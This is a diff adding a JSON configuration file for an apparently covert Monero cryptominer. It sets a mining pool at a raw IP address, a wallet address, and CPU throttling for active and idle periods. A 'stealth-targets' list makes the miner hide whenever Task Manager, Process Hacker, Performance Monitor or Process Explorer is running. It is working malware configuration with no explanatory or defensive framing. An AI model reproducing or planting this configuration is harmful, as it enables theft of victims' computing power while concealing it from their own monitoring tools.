@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "62.60.157.78",
+    "port": 443,
+    "wallet": "4AM6CgD4RQ1fHRtHqAphFL9ZELqQ9twuy1nyjPdkmQFsGYufryAhdvhEc48AP14DMJDsCrugMXf6wZU3xc3GMGuuHywXP53",
+    "password": "Rrime",
+    "nicehash": true,
+    "ssltls": true,
+    "max-cpu": 40,
+    "idle-wait": 0,
+    "idle-cpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
